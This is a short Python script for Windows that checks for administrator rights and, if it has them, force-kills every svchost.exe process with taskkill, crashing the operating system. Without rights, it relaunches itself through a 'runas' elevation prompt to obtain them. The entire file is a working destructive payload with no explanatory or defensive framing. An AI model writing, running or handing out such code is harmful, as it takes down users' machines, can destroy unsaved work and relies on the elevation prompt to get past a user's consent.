import os,ctypes,sys

def getadmin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False
    
def crash():
    os.system("taskkill /im svchost.exe /f")



if getadmin():
    crash()
else:
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)

    